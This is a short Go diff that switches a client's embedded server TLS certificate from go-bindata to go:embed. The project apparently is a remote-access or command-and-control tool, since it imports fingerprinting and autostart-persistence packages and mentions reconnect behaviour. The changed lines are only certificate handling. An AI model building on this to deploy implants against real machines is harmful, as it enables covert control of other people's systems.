@@ -3,6 +3,7 @@ package client
 import (
 	"crypto/tls"
 	"crypto/x509"
+	_ "embed"
 	"errors"
 	"io/ioutil"
 	"log"
@@ -15,8 +16,6 @@ import (
 	"github.com/elleven11/pantegana/client/fingerprinter"
 	"github.com/emersion/go-autostart"
 )
-
-//go:generate go-bindata -o cert.go ../cert/server.crt
 
 type Client struct {
 	Cfg         *ClientConfig
@@ -48,6 +47,14 @@ const (
 // special errors
 var ErrHTTPResponse = errors.New("http: server gave HTTP response to HTTPS client")
 
+// load the cert of the server
+//go:generate rm -fr cert
+//go:generate mkdir cert
+//go:generate cp ../cert/server.crt ./cert/
+
+//go:embed cert/server.crt
+var certData []byte
+
 func (cfg *ClientConfig) ClientSetup() *Client {
 	// set up own cert pool
 	tlsConfig := &tls.Config{RootCAs: x509.NewCertPool()}
@@ -63,12 +70,7 @@ func (cfg *ClientConfig) ClientSetup() *Client {
 		Timeout:   30 * time.Minute, // The client tries to reconnect anyways...
 	}
 
-	// load trusted cert path
-	caCert, err := Asset("../cert/server.crt")
-	if err != nil {
-		panic(err)
-	}
-	ok := tlsConfig.RootCAs.AppendCertsFromPEM(caCert)
+	ok := tlsConfig.RootCAs.AppendCertsFromPEM(certData)
 	if !ok {
 		panic("Couldn't load cert file")
 	}
